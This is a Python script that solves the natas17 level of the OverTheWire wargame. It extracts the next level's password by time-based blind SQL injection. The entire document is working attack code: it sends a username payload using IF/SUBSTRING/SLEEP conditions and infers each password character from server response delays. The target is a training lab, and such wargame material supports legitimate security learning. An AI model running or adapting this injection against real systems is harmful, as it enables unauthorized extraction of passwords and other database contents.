import requests
import string

url = ("http://natas17.natas.labs.overthewire.org/")
auth = ("natas17", "secret")

Alphabet = string.digits + string.ascii_lowercase + string.ascii_uppercase
password = ""

for position in range(1, 33):
    print(f"[*]Searching for characters in postition {position}.")

    for char in Alphabet:
        payload = {
            'username': f'natas18" AND IF(substring(password, {position}, 1) = BINARY "{char}", SLEEP(3), 0) -- -' # Time based SQL Injection that forces the server to sleep for 3 secs if a character from our Alphabet matches the character of the password for natas18
        }
        try:
            response = requests.post(url, data=payload, auth=auth)

            if response.elapsed.total_seconds() >= 2.8: # this line benchmarks the server's responce time
                password += char
                print(f"[!]Founded: {char} -> Current password is {password}")
                break
        
        except requests.exceptions.RequestException as e: # this line notifies us if the server fails to send respond for us 
            print(f"Network Error: {e}")

print(f"[+]Finally! u now can got the password! password is: {password}")